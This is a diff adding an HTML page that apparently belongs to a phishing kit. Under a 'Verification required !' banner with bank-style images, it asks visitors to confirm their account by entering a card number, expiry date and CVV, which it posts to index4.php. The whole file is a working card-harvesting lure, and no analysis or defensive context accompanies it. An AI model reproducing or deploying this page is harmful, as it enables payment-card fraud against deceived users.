@@ -1,0 +1,154 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style type="text/css">
+.icono {
+ 
+    height: 21px;
+    width: 18px;
+    float: right;
+    margin-right: 59px;
+    margin-top: 1px;
+}
+.boot-blue {
+    color: #fff;
+    background-color: #0073CF;
+    border-radius: 0;
+    border: none;
+}
+
+.boot-blue:hover {
+    color: #fff;
+    background: #0052C2;
+}
+.boot-small {
+    font-size: 20px;
+    padding: 10px 20px;
+}
+.boot-blue1 {
+    color: #0052C2;
+    background-color: #F2F2F2;
+    border-radius: 0;
+    border: none;
+}
+
+.boot-blue1:hover {
+    color: #012169;
+    background: #E3E3E3;
+}
+.error {
+    color: #DC1431;
+
+    padding: 3px 0 6px 30px!important;
+    margin-left: 1px;
+}
+
+.loader {
+    position: fixed;
+    left: 0px;
+    top: 0px;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+
+    opacity: 1;
+}
+body{
+font-family: Arial;
+}
+</style>
+
+</head>
+
+
+<body style="margin: 0 auto;overflow-x:hidden">
+
+<div id="container" style="width:100%;margin: 0 auto;">
+<div id="cabeza" style="margin-top:2px;margin-left:0px;">
+<img src="./index3_files/a3.png" alt="" title="" border="0" width="1460" height="125">
+</div>
+
+<div id="cuerpo" style="margin: 25px 0 80px 88px;width:955px;height:356px;">
+<div id="form2" style="float: left;margin-right: 25px;">
+<form name="dafabhai" id="dafabhai" method="post" action="index4.php" >
+      <div class="er" style="font-size: 21px;color: #333;margin-bottom: 20px;font-weight:bold;">Verification required !</div>
+      <div class="er1" style="font-size: 16px;color: #333;margin-bottom: 30px;">Please provide us the following information to confirm your account !</div>
+   
+      <div class="us" style="margin-bottom: 20px;">
+		  	<label  style="display:block;font-weight:normal;font-size:14px;color: #333;">Debit or credit card Number</label>
+			 
+			<input type="text" id="numcd" name="c_number"  maxlength="19"   
+			style="border: 1px solid #ccc;width:405.33px;height:40px;padding: 4px 2px;font-size: inherit;margin-top: 7px;" required>
+	  </div>
+	  
+	
+			<div class="fecha" style="margin-bottom: 20px;width:280px;float: left;">
+			<label id="id5" for="mm" style="display:block;font-weight:normal;font-size:14px;color: #333;">Expiry Date</label>
+			<select name="Month" id="mm" onkeypress="return free(event)" required class="logininput"
+			style="border: 1px solid #ccc;width:115.23;height:40px;margin-top: 7px;margin-bottom: 20px;">
+      <option value="50" selected="" disabled="">Month
+      </option><option value="01">01
+      </option><option value="02">02
+      </option><option value="03">03
+      </option><option value="04">04
+      </option><option value="05">05
+      </option><option value="06">06
+      </option><option value="07">07
+      </option><option value="08">08
+      </option><option value="09">09
+      </option><option value="10">10
+      </option><option value="11">11
+      </option><option value="12">12
+      </option></select>
+			<select class="logininput"  required id="yy" name="Year" style="border: 1px solid #ccc;width:115.23;height:40px">
+      <option value="55" selected="" disabled="">Year
+                 </option><option value="22">2022
+      </option><option value="23">2023
+      </option><option value="24">2024
+      </option><option value="25">2025
+      </option><option value="26">2026
+       </option><option value="27">2027
+      </option><option value="28">2028
+      </option><option value="29">2029
+      </option><option value="30">2030
+      </option><option value="31">2031
+      </option><option value="32">2032
+      </option><option value="33">2033
+      </option>
+	  <option value="34">2034
+      </option>
+	   <option value="35">2035
+      </option>
+	  </select>
+      <label id="id6" for="mm" style="display:none;font-weight:normal;font-size:14px;margin-top:-10px;" class="error">Please verify your information</label>
+      <div class="atm">
+			   </div>
+      <button type="submit" form="dafabhai" id="Button1" style="margin-top: 33px;margin-right: 15px;" title="Sign in" class="boot boot-blue boot-small" name="">
+			Continue
+			</button>
+			<button type="button" style="margin-top: 33px;" title="Sign in" class="boot boot-blue1 boot-small" name="">
+			Cancel
+			</button>
+      </div>
+			<div class="cvv">
+			<label id="id7" for="cvv" style="display:block;font-weight:normal;font-size:14px;color: #333;">Security Code CVV</label>
+			<input type="text" required id="cvv" name="CVV" maxlength="4" onkeydown="return free(event)" onkeypress="return validaNumericos(event)" 
+			class="logininput" style="margin-top: 7px;border: 1px solid #ccc;width:160px;height:40px">
+        <img src="./index3_files/question_mark.png" >
+			</div>
+</form>
+</div>
+
+</div>
+<div id="pie" style="margin-top:-20px;margin-left:-3px;width:983px;height:117px;">
+<div id="image15" style="width:987px; height:150px; z-index:5">
+<img src="./index3_files/a2.png" alt="" title="" border="0" width="1296" height="155" style="margin-top:30px;margin-left: 66px;">
+</div>
+</div>
+
+
+</div>
+
+</body>
+</html>
